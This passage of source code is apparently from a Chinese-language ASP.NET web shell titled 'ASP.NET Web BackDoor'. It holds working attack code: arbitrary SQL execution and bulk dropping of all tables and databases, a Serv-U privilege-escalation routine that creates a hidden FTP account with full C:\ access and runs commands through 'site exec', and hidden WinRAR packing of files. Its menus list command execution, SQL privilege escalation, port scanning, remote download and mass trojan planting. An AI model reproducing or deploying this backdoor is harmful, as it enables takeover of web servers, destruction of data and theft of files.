                  this.GridView1.DataBind();
              }
              catch (Exception de) 
              {
                  Response.Write(de.Message.ToString());
                  return;
              }
              dataconn.Close();
              dataconn.Dispose();
              this.GridView1.Visible = true;
          }
        }
    }
    public string oportstr;
    public string osqlnamestr;
    public string osqlpassstr;
    public string osqldatabasestr;
    public string osqltablestr;
    public SqlCommand getocmd;  
    public SqlConnection pconn() 
    {
         oportstr = kusqlport.Text.Trim ();
         switch (oportstr) 
         {
             case "1433":
                 oportstr = "";
                 break;
             case "":
                 oportstr ="";
                 break ; 
         }
        osqlnamestr = kusqlname.Text.Trim ();
        osqlpassstr = kusqlpass.Text .Trim ();
        osqldatabasestr = ListBox3.SelectedItem.ToString ();
        SqlConnection getpconn = new SqlConnection("server=." + oportstr + ";User ID=" + osqlnamestr + ";Password=" + osqlpassstr + ";database=" + osqldatabasestr);
        return getpconn;
    }
    
    protected void dropdata_Click(object sender, EventArgs e)
    {

        try
        {
            SqlConnection conn = pconn();
            conn.Open();
            getocmd = new SqlCommand(datastr.Text.Trim(), conn);
            getocmd.ExecuteNonQuery();
            getocmd.Dispose();
            Response.Write("<script>alert('删除ＯＫ！')</" + "script>");
            this.GridView1.Visible = false;
            conn.Close();
            conn.Dispose();
        }
        catch (Exception cn)
        {
            Response.Write(cn.Message.ToString());
            return;
        }
    }


    protected void updatebtn_Click(object sender, EventArgs e)
    {
        try
        {
            SqlConnection conn = pconn();
            conn.Open();
            getocmd = new SqlCommand(dataupdate.Text.Trim(), conn);
            getocmd.ExecuteNonQuery();
            getocmd.Dispose();
            Response.Write("<script>alert('更新成功!')</" + "script>");
            this.GridView1.Visible = false;
            conn.Close();
            conn.Dispose();
        }
        catch (Exception ep) 
        {
            Response.Write(ep.Message.ToString());
            return;
        }
    }

    protected void addbtn_Click(object sender, EventArgs e)
    {
        try
        {
            SqlConnection conn = pconn();
            conn.Open();
            getocmd = new SqlCommand(dataadd.Text.Trim(), conn);
            getocmd.ExecuteNonQuery();
            Response.Write("<script>alert('添加成功！')</" + "script>");
            this.GridView1.Visible = false;
            getocmd.Dispose();
            conn.Close();
            conn.Dispose();
        }
        catch (Exception c) 
        {
            Response.Write(c.ToString());
            Response.End();
        }
    }
    protected void ctbtn_Click(object sender, EventArgs e)
    {
        SqlConnection conn = pconn();
        conn.Open();
        getocmd = new SqlCommand(addbiao.Text.Trim(), conn);
        getocmd.ExecuteNonQuery();
        Response.Write("<script>alert('建表成功！')</" + "script>");
        getocmd.Dispose();
        conn.Close();
        conn.Dispose();
    }
    public string usertabdel;
    public string plsb;
    protected void Button4_Click(object sender, EventArgs e)
    {
        if (ListBox4.Items.Count != 0) 
        {
            SqlConnection conn = pconn();
            conn.Open();
            string usertabsql = "select * from sysobjects where xtype='u'";
            getocmd = new SqlCommand(usertabsql, conn);
            SqlDataReader jksdr = getocmd.ExecuteReader();
            while (jksdr.Read()) 
            {
                usertabdel += jksdr.GetValue(0).ToString() + ",";
            }
            jksdr.Close();
            jksdr.Dispose();
            getocmd.Dispose();
            int zuihou = usertabdel.LastIndexOf (",");
            string jiequ = usertabdel.Substring(0, zuihou);
            string[] fenge = jiequ.Split(',');
            foreach (string fengef in fenge) 
            {
                plsb =  "drop table [" + fengef.ToString() + "]" ;
                getocmd = new SqlCommand(plsb, conn);
                getocmd.ExecuteNonQuery();           
            }
            getocmd.Dispose();
            conn.Close();
            conn.Dispose();
        }
    }

    public void getlistku() 
    {
        string kp = kusqlport.Text;
        if (kp == "1433") 
        {
             kp = "";
        }
        else if (kp == "")
        {
            kp = "";
        }
        else 
        {
            kp = "," + kp;
        }

        SqlConnection connku = new SqlConnection("server=." + kp + ";User ID=" + kusqlname.Text + ";Password=" + kusqlpass.Text);
        connku.Open();
        string jkku = "USE master SELECT name FROM SYSDATABASES";
        getocmd = new SqlCommand(jkku, connku);
        SqlDataReader jkkudr = getocmd.ExecuteReader();
        while (jkkudr.Read()) 
        {
            ListBox3.Items.Add(jkkudr.GetValue(0).ToString());
        }
        jkkudr.Close();
        jkkudr.Dispose();
        connku.Close();
        connku.Dispose();
    }

    public string getdelkustr;
    public string getdelneiku;
    protected void delku_Click(object sender, EventArgs e)
    {
        if (ListBox3.Items.Count != 0) 
        {
            try
            {
                SqlConnection conn = new SqlConnection("server=.;uid=" + kusqlname.Text + ";pwd=" + kusqlpass.Text);
                conn.Open();
                string getdelkustr = "select * from sysdatabases where sid<>0x01";
                getocmd = new SqlCommand (getdelkustr,conn);
                SqlDataReader deldr = getocmd.ExecuteReader();
                while (deldr.Read()) 
                {
                    getdelneiku += deldr.GetValue(0).ToString() + ",";
                }
                deldr.Close();
                deldr.Dispose();
                getocmd.Dispose();
                int houzhui = getdelneiku.LastIndexOf(",");
                getdelneiku = getdelneiku.Substring(0, houzhui);
                string[] getneiku = getdelneiku.Split(',');
                foreach ( string nk in getneiku  )
                {
                    getocmd = new SqlCommand("drop database " + nk.ToString () , conn);
                    getocmd.ExecuteNonQuery();
                    getocmd.Dispose();
                   
                }
                Response.Write("<script>alert('成功批量删除数据库!')</" + "script>");
                conn.Close();
                conn.Dispose();
                ListBox3.Items.Clear();
                getlistku();
            }
            catch (Exception errorsa) 
            {
                Response.Write(errorsa.Message.ToString());
                Response.End();
            }
   
        }
    }

    protected void delzdb_Click(object sender, EventArgs e)
    {
        if (ListBox4.Items.Count != 0)
        {
            string kp = kusqlport.Text;
            if (kp == "1433")
            {
                kp = "";
            }
            else if (kp == "")
            {
                kp = "";
            }
            else 
            {
                kp = "," + kp;
            }
            SqlConnection conn = new SqlConnection("server=." + kp + ";User ID=" + kusqlname.Text + ";Password=" + kusqlpass.Text + ";database=" + ListBox3.SelectedItem.ToString());
            conn.Open();
            getocmd = new SqlCommand("drop table [" + ListBox4.SelectedItem.ToString() + "]", conn);
            getocmd.ExecuteNonQuery();
            Response.Write("<script>alert('删除成功！')</" + "script>");
            conn.Close();
            conn.Dispose();
        }
    }

    protected void delzdk_Click(object sender, EventArgs e)
    {
        if (ListBox3.Items.Count != 0)
        {
            string kp = kusqlport.Text;
            if (kp == "1433")
            {
                kp = "";
            }
            else if (kp == "")
            {
                kp = "";
            }
            else
            {
                kp = "," + kp;
            }
            SqlConnection conn = new SqlConnection("server=." + kp + ";User ID=" + kusqlname.Text + ";Password=" + kusqlpass.Text);
            conn.Open();
            getocmd = new SqlCommand("drop database " + ListBox3.SelectedItem.ToString(), conn);
            getocmd.ExecuteNonQuery();
            Response.Write("<script>alert('删除成功！')</" + "script>");
            conn.Close();
            conn.Dispose();
            ListBox3.Items.Clear();
            getlistku();
        }
    }

    public void getacctable() 
    {
        string connstr = accstr.Text.Trim();
        OleDbConnection oleconn = new OleDbConnection(connstr);
        oleconn.Open();
        System.Data.DataTable dt = new System.Data.DataTable();
        dt = oleconn.GetOleDbSchemaTable(OleDbSchemaGuid.Tables, new Object[] { null, null, null, "Table" });
        for (int ok = 0; ok < dt.Rows.Count; ok++)
        {
            ListBox5.Items.Add(dt.Rows[ok].ItemArray[2].ToString());
        }
        oleconn.Close();
        oleconn.Dispose();
    }
    
    protected void accconn_Click(object sender, EventArgs e)
    {
        string connstr = accstr.Text.Trim();
        getacctable();
    }

    public void getdg() 
    {
        string gvstr = "select * from [" + ListBox5.SelectedItem.ToString() + "]";
        OleDbConnection oleconn = new OleDbConnection(accstr.Text.Trim());
        oleconn.Open();
        OleDbDataAdapter oleda = new OleDbDataAdapter(gvstr, oleconn);
        System.Data.DataSet oleds = new System.Data.DataSet();
        oleda.Fill(oleds, ListBox5.SelectedItem.ToString());
        GridView2.DataSource = oleds;
        GridView2.DataBind();
        oleda.Dispose();
        oleconn.Close();
        oleconn.Dispose();
    }
    
    protected void ListBox5_SelectedIndexChanged(object sender, EventArgs e)
    {
        getdg();
    }

    protected void acczdb_Click(object sender, EventArgs e)
    {
        OleDbConnection oe = new OleDbConnection(accstr.Text.Trim());
        oe.Open();
        OleDbCommand oc = new OleDbCommand("drop table [" + ListBox5.SelectedItem.ToString() + "]", oe);
        oc.ExecuteNonQuery();
        Response.Write("<script>alert('删除表成功！')</"+"script>");   
        oc.Dispose();
        oe.Close();
        oe.Dispose();
        ListBox5.Items.Clear();
        getacctable();
    }

    protected void accpl_Click(object sender, EventArgs e)
    {
        OleDbConnection oee = new OleDbConnection(accstr.Text.Trim());
        oee.Open();
        for (int jj = 0; jj < ListBox5.Items.Count; jj++) 
        {
            string delact = "drop table [" + ListBox5.Items[jj].ToString() + "]";
            OleDbCommand occ = new OleDbCommand(delact, oee);
            occ.ExecuteNonQuery();
            occ.Dispose();
        }
        Response.Write("<script>alert('批量清除完毕！')</" + "script>");
        oee.Close();
        oee.Dispose();
        ListBox5.Items.Clear();
        getacctable();
        
    }

    protected void accadd_Click(object sender, EventArgs e)
    {
        OleDbConnection oe = new OleDbConnection(accstr.Text.Trim());
        oe.Open();
        string addsql = addtxt.Text.Trim();
        OleDbCommand oc = new OleDbCommand(addsql, oe);
        oc.ExecuteNonQuery();
        Response.Write("<script>alert('成功添加数据，请刷新表!')</" + "script>");
        oc.Dispose();
        oe.Close();
        oe.Dispose();
    }

    protected void accupdate_Click(object sender, EventArgs e)
    {
        OleDbConnection oe = new OleDbConnection(accstr.Text.Trim());
        oe.Open();
        string updatesql = updatetxt.Text.Trim();
        OleDbCommand oc = new OleDbCommand(updatesql, oe);
        oc.ExecuteNonQuery();
        Response.Write("<script>alert('成功更新数据，请刷新表!')</" + "script>");
        oc.Dispose();
        oe.Close();
        oe.Dispose();
    }

    protected void accdel_Click(object sender, EventArgs e)
    {
        OleDbConnection oe = new OleDbConnection(accstr.Text);
        oe.Open();
        string delsql = deltxt.Text.Trim();
        OleDbCommand oc = new OleDbCommand(delsql, oe);
        oc.ExecuteNonQuery();
        Response .Write ("<script>alert('成功删除数据，请刷新表!')</" + "script>");
        oc.Dispose();
        oe.Close();
        oe.Dispose();
    }

    protected void jksubtn_Click(object sender, EventArgs e)
    {
        string getall = "";
        string getjksuname = jksuname.Text;
        string getjksupass = jksupass.Text;
        Int32  getjksuport = Convert.ToInt32(jksuport.Text);
        string getjksucmd = jksucmd.Text;
        string getjkloginuser = "User " + getjksuname + "\r\n";
        string getjkloginpass = "Pass " + getjksupass + "\r\n";
        string getjknewdomain = "-SETDOMAIN\r\n-Domain=jk|0.0.0.0|68915|-1|1|0\r\n-TZOEnable=0\r\n TZOKey=\r\n";
        string getjkdeldomain = "-DELETEDOMAIN\r\n-IP=0.0.0.0\r\n PortNo=68915\r\n";
        string getjknewuser = "-SETUSERSETUP\r\n-IP=0.0.0.0\r\n-PortNo=68915\r\n-User=jk\r\n-Password=mhjk\r\n-HomeDir=c:\\\r\n-LoginMesFile=\r\n-Disable=0\r\n-RelPaths=1\r\n-NeedSecure=0\r\n-HideHidden=0\r\n-AlwaysAllowLogin=0\r\n-ChangePassword=0\r\n-QuotaEnable=0\r\n-MaxUsersLoginPerIP=-1\r\n-SpeedLimitUp=0\r\n-SpeedLimitDown=0\r\n-MaxNrUsers=-1\r\n-IdleTimeOut=600\r\n-SessionTimeOut=-1\r\n-Expire=0\r\n-RatioDown=1\r\n-RatiosCredit=0\r\n-QuotaCurrent=0\r\n-QuotaMaximum=0\r\n-Maintenance=System\r\n-PasswordType=Regular\r\n-Ratios=NoneRN\r\n Access=c:\\|RWAMELCDP\r\n";
        string getjkquite = "QUIT\r\n";
        string getsite = "SITE MAINTENANCE\r\n";
        try 
        {
            TcpClient sutc = new TcpClient("127.0.0.1", getjksuport);
            sutc.ReceiveBufferSize = 1024;
            NetworkStream ns = sutc.GetStream();
            getall = getjkrev(ns);
            getall += getjksend(ns, getjkloginuser);
            getall += getjkrev(ns);
            getall += getjksend(ns, getjkloginpass);
            getall += getjkrev(ns);
            getall += getjksend(ns, getsite );
            getall += getjkrev(ns);
            getall += getjksend(ns, getjkdeldomain);
            getall += getjkrev(ns);
            getall += getjksend(ns, getjknewdomain);
            getall += getjkrev(ns);
            getall += getjksend(ns, getjknewuser);
            getall += getjkrev(ns);
            TcpClient sutc1 = new TcpClient("127.0.0.1", 68915);
            NetworkStream ns1 = sutc1.GetStream();
            getall += getjkrev(ns1);
            getall += getjksend(ns1, "user jk\r\n");
            getall += getjkrev(ns1);
            getall += getjksend(ns1, "pass mhjk\r\n");
            getall += getjkrev(ns1);
            getall += getjksend (ns1, "site exec " + getjksucmd + "\r\n");
            getall += getjkrev(ns1);
            sutc1.Close();
            getall += getjksend(ns, getjkdeldomain);
            getall += getjkrev(ns);
            getall += getjksend(ns, getjkquite);
            getall += getjkrev (ns);
            sutc.Close();
        }
        catch (Exception suerr)
        {
            Response.Write(suerr.Message.ToString());
           
        }
        Response.Write("<font color='red'>" + getall + "</font>");
    }
    public string getjkrev(NetworkStream jkstream) 
    {
        string revstr = "";
        if (jkstream.CanRead) 
        {
            byte[] buffer = new byte[1024];
            jkstream.Read(buffer, 0, buffer.Length);
            revstr = Encoding.ASCII.GetString(buffer);
        }
        return "<font color='red'>" + revstr + "</font>";
    }
    public string getjksend(NetworkStream jkstream, string jksend) 
    {
        if (jkstream.CanWrite) 
        {
            byte[] buffer = Encoding.ASCII.GetBytes(jksend);
            jkstream.Write(buffer, 0, buffer.Length);
        }
        return "<font color='red'>" + jksend + "</font>";
    }

    protected void dabaobtn_Click(object sender, EventArgs e)
    {
        if (daboml.Text.Trim() != "")
        {
            if (dabaodz.Text.Trim() != "")
            {

                //if (Path.GetExtension(dabaodz.Text.Trim().ToLower()) == "rar")
                //{
                    String the_rar;
                    RegistryKey the_Reg;
                    Object the_Obj;
                    String the_Info;
                    ProcessStartInfo the_StartInfo;
                    Process the_Process;
                    try
                    {
                        the_Reg = Registry.ClassesRoot.OpenSubKey(@"Applications\WinRAR.exe\Shell\Open\Command");
                        the_Obj = the_Reg.GetValue("");   
                        the_rar = the_Obj.ToString();
                        the_Reg.Close();
                        the_rar = the_rar.Substring(1, the_rar.Length - 7);
                        the_Info = " a " + dabaodz.Text.ToString() + "  " + Getdbfilea(daboml.Text); 
                        the_StartInfo = new ProcessStartInfo();
                        the_StartInfo.FileName = the_rar;
                        the_StartInfo.Arguments = the_Info;
                        the_StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        the_StartInfo.WorkingDirectory = "C:\\"; 
                        the_Process = new Process();
                        the_Process.StartInfo = the_StartInfo;
                        the_Process.Start();
                        Response.Write("打包成功");
                    }
                    catch (Exception ex)
                    {
                        Response.Write(ex.Message.ToString());
                        Response.End();
                    }
                //}
                //else 
                //{
                //    Response.Write("<script>alert('打包后缀名为rar')</" + "script>");
                //}
            }
        }
    }
    public bool  chknumber( string the_regstr ) 
    {
        System.Text.RegularExpressions.Regex jk_reg = new Regex("^0|[0-9]*[1-9][0-9]*$");
        if (jk_reg.IsMatch(the_regstr))
        {
            return true;
        }
        else 
        {
            return false;
        }
    }

    protected void Button5_Click(object sender, EventArgs e)
    {
        if (TextBox1.Text.Trim() == jksessionpass)
        {
            Session["jksession"] = "jk1986";
            Session.Timeout = 120000;
        }
    }

    protected void CheckBox1_CheckedChanged(object sender, EventArgs e)
    {
        if (CheckBox1.Checked == true) 
        {
            File.SetAttributes(fileconfigpath.Text.ToString(), FileAttributes.ReadOnly);
        } 
    }

    protected void CheckBox2_CheckedChanged(object sender, EventArgs e)
    {
        if (CheckBox2.Checked == true) 
        {
            File.SetAttributes(fileconfigpath.Text.ToString(), File.GetAttributes(fileconfigpath.Text) | FileAttributes.Hidden);
        }
    }

    protected void CheckBox3_CheckedChanged(object sender, EventArgs e)
    {
        if (CheckBox3.Checked == true) 
        {
            File.SetAttributes(fileconfigpath.Text.ToString(), File.GetAttributes(fileconfigpath.Text) | FileAttributes.System);
        }
    }

    protected void CheckBox4_CheckedChanged(object sender, EventArgs e)
    {
        if (CheckBox4.Checked == true) 
        {
            File.SetAttributes(fileconfigpath.Text.ToString(), File.GetAttributes(fileconfigpath.Text) | FileAttributes.Archive);
        }
    }
    protected void TreeView2_TreeNodeExpanded(object sender, TreeNodeEventArgs e)
    {
        if (TreeView3.Nodes[0].Expanded  == true )
        {
            Response.Write("<script>alert('提权目录未折叠，程序自动刷新！');location.href='"+ getselfurl  +"'</"+"script>");
            Response.End();
        }
        if (TreeView1.Nodes[0].Expanded == true) 
        {
            Response.Write("<script>alert('本地硬盘未折叠，程序自动刷新！');location.href='" + getselfurl + "'</" + "script>");
            Response.End();
        }
        if (TreeView4.Nodes[0].Expanded == true) 
        {
           Response.Write ("<script>alert('Shell功能未折叠，程序自动刷新！');location.href='"+ getselfurl  +"'</"+"script>");
           Response.End ();
        }
        if (TreeView5.Nodes [0].Expanded == true )
        {
           Response.Write ("<script>alert('数据库操作未折叠，程序自动刷新！');location.href='"+ getselfurl  +"'</"+"script>");
           Response.End();
        }
    }

    protected void TreeView1_TreeNodeExpanded(object sender, TreeNodeEventArgs e)
    {
        if (TreeView3.Nodes[0].Expanded == true)
        {
            Response.Write("<script>alert('提权目录未折叠，程序自动刷新！');location.href='" + getselfurl + "'</" + "script>");
            Response.End();
        }
        if (TreeView2.Nodes[0].Expanded == true)
        {
            Response.Write("<script>alert('文件目录未折叠，程序自动刷新！');location.href='" + getselfurl + "'</" + "script>");
            Response.End();
        }
        if (TreeView4.Nodes[0].Expanded == true)
        {
            Response.Write("<script>alert('Shell功能未折叠，程序自动刷新！');location.href='" + getselfurl + "'</" + "script>");
            Response.End();
        }
        if (TreeView5.Nodes[0].Expanded == true)
        {
            Response.Write("<script>alert('数据库操作未折叠，程序自动刷新！');location.href='" + getselfurl + "'</" + "script>");
            Response.End();
        }
    }

    protected void TreeView3_TreeNodeExpanded(object sender, TreeNodeEventArgs e)
    {
        if (TreeView2.Nodes[0].Expanded == true)
        {
            Response.Write("<script>alert('文件目录未折叠，程序自动刷新！');location.href='" + getselfurl + "'</" + "script>");
            Response.End();
        }
        if (TreeView1.Nodes[0].Expanded == true)
        {
            Response.Write("<script>alert('本地硬盘未折叠，程序自动刷新！');location.href='" + getselfurl + "'</" + "script>");
            Response.End();
        }
        if (TreeView4.Nodes[0].Expanded == true)
        {
            Response.Write("<script>alert('Shell功能未折叠，程序自动刷新！');location.href='" + getselfurl + "'</" + "script>");
            Response.End();
        }
        if (TreeView5.Nodes[0].Expanded == true)
        {
            Response.Write("<script>alert('数据库操作未折叠，程序自动刷新！');location.href='" + getselfurl + "'</" + "script>");
            Response.End();
        }
    }

    protected void TreeView4_TreeNodeExpanded1(object sender, TreeNodeEventArgs e)
    {
        if (TreeView3.Nodes[0].Expanded == true)
        {
            Response.Write("<script>alert('提权目录未折叠，程序自动刷新！');location.href='" + getselfurl + "'</" + "script>");
            Response.End();
        }
        if (TreeView1.Nodes[0].Expanded == true)
        {
            Response.Write("<script>alert('本地硬盘未折叠，程序自动刷新！');location.href='" + getselfurl + "'</" + "script>");
            Response.End();
        }
        if (TreeView2.Nodes[0].Expanded == true)
        {
            Response.Write("<script>alert('文件目录未折叠，程序自动刷新！');location.href='" + getselfurl + "'</" + "script>");
            Response.End();
        }
        if (TreeView5.Nodes[0].Expanded == true)
        {
            Response.Write("<script>alert('数据库操作未折叠，程序自动刷新！');location.href='" + getselfurl + "'</" + "script>");
            Response.End();
        }
    }

    protected void TreeView5_TreeNodeExpanded(object sender, TreeNodeEventArgs e)
    {
        if (TreeView3.Nodes[0].Expanded == true)
        {
            Response.Write("<script>alert('提权目录未折叠，程序自动刷新！');location.href='" + getselfurl + "'</" + "script>");
            Response.End();
        }
        if (TreeView1.Nodes[0].Expanded == true)
        {
            Response.Write("<script>alert('本地硬盘未折叠，程序自动刷新！');location.href='" + getselfurl + "'</" + "script>");
            Response.End();
        }
        if (TreeView4.Nodes[0].Expanded == true)
        {
            Response.Write("<script>alert('Shell功能未折叠，程序自动刷新！');location.href='" + getselfurl + "'</" + "script>");
            Response.End();
        }
        if (TreeView2.Nodes[0].Expanded == true)
        {
            Response.Write("<script>alert('文件目录未折叠，程序自动刷新！');location.href='" + getselfurl + "'</" + "script>");
            Response.End();
        }
    }
</script>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" >
<head runat="server">
    <title>ASP.NET Web BackDoor</title>
<style type="text/css">
<!--
a:link {
	font-family: "宋体";
	font-size: 12px;
	color: #000000;
	text-decoration: none;
}
a:visited {
	font-family: "新宋体";
	font-size: 12px;
	color: #000000;
	text-decoration: none;
}
a:hover {
	font-family: "宋体";
	font-size: 12px;
	color: #FF0000;
	text-decoration: underline;
}
a:active {
	font-family: "宋体";
	font-size: 12px;
	color: #000000;
	text-decoration: none;
}
.STYLE1 {font-size: 12px}
-->
</style>
<script type="text/javascript">
function test()
{
if(!confirm('确认删除本信息吗？')) return false;
}
</script>    
</head>

<body style="text-align: center">
    <form id="form1" runat="server">
    <%

    if (Session["jksession"] != null )
    {
        Response.Write("<P class='STYLE1'>千秋邈矣独留我，百战归来再读书。</P>");
        Response.Write("<p class='STYLE1'><a href='?action=shuaxin'>刷新页面</a></p>");
        if (Request.Params["action"] == "shuaxin")
        {
           Response.Write("<script>alert('刷新页面 ^_^ ');location.href='" + getselfurl  +"'</" + "script>");
        } 
        Response.Write("<hr/>");
 %>    
       
        <table style="width: 631px">
            <tr>
                <td style="width: 100px; height: 172px;" valign="top">
                    <asp:TreeView ID="TreeView1" runat="server" ExpandDepth="0" Font-Size="12px" ForeColor="Black"
                        Height="27px" OnSelectedNodeChanged="TreeView1_SelectedNodeChanged" Width="64px" OnTreeNodeExpanded="TreeView1_TreeNodeExpanded">
                    </asp:TreeView>
                </td>
                <td style="width: 100px; height: 172px;" valign="top">
                    <asp:TreeView ID="TreeView2" runat="server" ExpandDepth="0" Font-Size="12px" ForeColor="Black"
                        OnSelectedNodeChanged="TreeView2_SelectedNodeChanged" OnTreeNodeExpanded="TreeView2_TreeNodeExpanded">
                        <Nodes>
                            <asp:TreeNode Text="文件目录" Value="文件目录">
                                <asp:TreeNode Text="站点根目录" Value="站点根目录"></asp:TreeNode>
                                <asp:TreeNode Text="本程序目录" Value="本程序目录"></asp:TreeNode>
                                <asp:TreeNode Text="新建目录" Value="新建目录"></asp:TreeNode>
                                <asp:TreeNode Text="新建文本" Value="新建文本"></asp:TreeNode>
                                <asp:TreeNode Text="上传文件" Value="上传文件"></asp:TreeNode>
                                <asp:TreeNode Text="批量挂马" Value="批量挂马"></asp:TreeNode>
                                <asp:TreeNode Text="批量清马" Value="批量清马"></asp:TreeNode>
                                <asp:TreeNode Text="查找木马" Value="查找木马"></asp:TreeNode>
                            </asp:TreeNode>
                        </Nodes>
                    </asp:TreeView>
                </td>
                <td style="width: 100px; height: 172px;" valign="top">
                    <asp:TreeView ID="TreeView3" runat="server" ExpandDepth="0" Font-Size="12px" ForeColor="Black" OnSelectedNodeChanged="TreeView3_SelectedNodeChanged" OnTreeNodeExpanded="TreeView3_TreeNodeExpanded">
                        <Nodes>
                            <asp:TreeNode Text="提权目录" Value="提权目录">
                                <asp:TreeNode Text="Program Files" Value="Program Files"></asp:TreeNode>
                                <asp:TreeNode Text="Documents and Settings" Value="Documents and Settings"></asp:TreeNode>
                                <asp:TreeNode Text="PcAnywhere" Value="PcAnywhere"></asp:TreeNode>
                                <asp:TreeNode Text="Serv-U(I)" Value="Serv-U(I)"></asp:TreeNode>
                                <asp:TreeNode Text="Serv-U(II)" Value="Serv-U(II)"></asp:TreeNode>
                                <asp:TreeNode Text="开始菜单" Value="开始菜单"></asp:TreeNode>
                                <asp:TreeNode Text="Real" Value="Real"></asp:TreeNode>
                                <asp:TreeNode Text="Sql Server" Value="Sql Server"></asp:TreeNode>
                                <asp:TreeNode Text="Config" Value="Config"></asp:TreeNode>
                                <asp:TreeNode Text="Inetsrv" Value="Inetsrv"></asp:TreeNode>
                                <asp:TreeNode Text="Temp" Value="Temp"></asp:TreeNode>
                                <asp:TreeNode Text="Repair" Value="Repair"></asp:TreeNode>
                            </asp:TreeNode>
                        </Nodes>
                    </asp:TreeView>
                </td>
                <td style="width: 100px; height: 172px;" valign="top"><asp:TreeView ID="TreeView4" runat="server" ExpandDepth="0" Font-Size="12px" ForeColor="Black" OnSelectedNodeChanged="TreeView4_SelectedNodeChanged" OnTreeNodeExpanded="TreeView4_TreeNodeExpanded1" >
                    <Nodes>
                        <asp:TreeNode Text="功能模块" Value="功能模块">
                            <asp:TreeNode Text="系统信息" Value="系统信息"></asp:TreeNode>
                            <asp:TreeNode Text="Cmd执行" Value="Cmd执行"></asp:TreeNode>
                            <asp:TreeNode Text="进程管理" Value="进程管理"></asp:TreeNode>
                            <asp:TreeNode Text="SQL提权(SA)" Value="SQL提权(SA)"></asp:TreeNode>
                            <asp:TreeNode Text="SQL提权(dbowner or public)" Value="SQL提权(dbowner or public)"></asp:TreeNode>
                            <asp:TreeNode Text="注册表读取" Value="注册表读取"></asp:TreeNode>
                            <asp:TreeNode Text="端口扫描" Value="端口扫描"></asp:TreeNode>
                            <asp:TreeNode Text="远程下载" Value="远程下载"></asp:TreeNode>
                            <asp:TreeNode Text="SU提权" Value="SU提权"></asp:TreeNode>
                            <asp:TreeNode Text="遍历IIS" Value="遍历IIS"></asp:TreeNode>
                        </asp:TreeNode>
                    </Nodes>
                </asp:TreeView>
                </td>
                <td style="width: 100px; height: 172px;" valign="top" align="center"><asp:TreeView ID="TreeView5" runat="server" ExpandDepth="0" Font-Size="12px" ForeColor="Black" OnSelectedNodeChanged="TreeView4_SelectedNodeChanged" OnTreeNodeExpanded="TreeView5_TreeNodeExpanded"   >
                    <Nodes>
                        <asp:TreeNode Text="数据库和退出" Value="数据库和退出">
                            <asp:TreeNode Text="SQL Server" Value="SQL Server"></asp:TreeNode>
                            <asp:TreeNode Text="Access" Value="Access"></asp:TreeNode>
                            <asp:TreeNode Text="文件打包" Value="文件打包"></asp:TreeNode>
                             <asp:TreeNode Text="About" Value="About"></asp:TreeNode>
                            <asp:TreeNode Text="退出登陆" Value="退出登陆"></asp:TreeNode>
                        </asp:TreeNode>
                    </Nodes>
                </asp:TreeView>
                </td>
            </tr>
        </table>
        <table style="font-size: 12px; width: 631px; text-align: left;">
            <tr>
                <td colspan="2" style="height: 21px">
                    <asp:Label ID="Label2" runat="server" OnLoad="Label2_Load"></asp:Label></td>
            </tr>
            <tr>
                <td colspan="2" style="height: 21px; width: 631px;" valign="top">
                    <asp:Label ID="Label1" runat="server"></asp:Label></td>
            </tr>
        </table>
        <% if (Request.QueryString["action"] == "edit")
           {
               if (Request.QueryString["File"] != "")
               {

                   editpath.Visible = true;
                   filecontent.Text = getcontent;
                   %>
                   <table style="font-size: 12px; width: 888px">
            <tr>
                <td colspan="3" align="center">
                    路径:&nbsp;
                    <asp:TextBox ID="editpath" runat="server" Width="287px" ReadOnly="True"></asp:TextBox></td>
            </tr>
            <tr>
                <td colspan="3" style="height: 424px" align="center">
                    <asp:TextBox ID="filecontent" runat="server" Height="411px" TextMode="MultiLine" Width="857px"></asp:TextBox></td>
            </tr>
            <tr>
                <td align="center" colspan="3" style="height: 21px">
                    <asp:Button ID="Button1" runat="server" OnClick="Button1_Click" Text=" 保 存 " Font-Size="12px" /></td>
            </tr>
        </table>
        
        
        
                   <%
               }
           }
           else 
           {
               editpath.Visible = false;
           }
        
        %>
        
        <%
            if (Request.QueryString["action"] == "rename")
            {
                if (Request.QueryString["File"] != "")
                {
                    refilename.Visible = true;
                    refilename.Text = getname;
                    %>
                    
                    <table style="font-size: 12px; width: 562px">
            <tr>
                <td align="center" style="width: 108px; height: 26px">
                    需要重命名文件:
                </td>
                <td style="width: 95px; height: 26px">
                    <asp:TextBox ID="refilename" runat="server" Width="268px"></asp:TextBox></td>
                <td align="left" style="width: 100px; height: 26px">
                    <asp:Button ID="Button3" runat="server" Font-Size="12px" OnClick="Button2_Click"
                        Text=" 确 认 " /></td>
            </tr>
        </table>
        <%        
            }
        }
        else 
            {
                refilename.Visible = false;
            }           
        
         %>
        
        <%
            if (Request.QueryString["action"] == "config")
            {
                if (Request.QueryString["File"] != "")
                {

            
             %>
        <table style="width: 800px; font-size: 12px;">
            <tr>
                <td style="width: 169px; height: 37px;" align="right">
                    文件路径:&nbsp;
                </td>
                <td style="width: 95px; height: 37px;">
                    <asp:TextBox ID="fileconfigpath" runat="server" Font-Size="12px" Width="350px"></asp:TextBox></td>
                <td style="width: 100px; height: 37px;">
                </td>
            </tr>
            <tr>
                <td style="width: 169px; height: 34px;" align="right">
                    属性设置:&nbsp;
                </td>
                <td colspan="2" align="left" style="height: 34px">
                    <asp:CheckBox ID="CheckBox1" runat="server" Text="只读" AutoPostBack="True" OnCheckedChanged="CheckBox1_CheckedChanged" />
                    &nbsp; &nbsp;
                    <asp:CheckBox ID="CheckBox2" runat="server" Text="隐藏" OnCheckedChanged="CheckBox2_CheckedChanged" AutoPostBack="True" />
                    &nbsp; &nbsp;
                    <asp:CheckBox ID="CheckBox3" runat="server" Text="系统" OnCheckedChanged="CheckBox3_CheckedChanged" AutoPostBack="True" />
                    &nbsp;&nbsp; &nbsp;<asp:CheckBox ID="CheckBox4" runat="server" Text="存档" OnCheckedChanged="CheckBox4_CheckedChanged" AutoPostBack="True" /></td>
            </tr>
            
              
        </table>
         <%
            }
        }
           if (TreeView2.SelectedValue.ToString() != "")  
           {
               if (TreeView2.SelectedNode.Text == "新建目录")
               {
                   cfolderstr.Text = Server.MapPath (".") + "\\" +"jk";
                   
       %>     
        <table style="font-size: 12px; width: 450px">
            <tr>
                <td style="width: 100px; height: 21px">
                    新 建 目 录:</td>
                <td style="width: 100px; height: 21px">
                    <asp:TextBox ID="cfolderstr" runat="server" Font-Size="12px" Width="170px"></asp:TextBox></td>
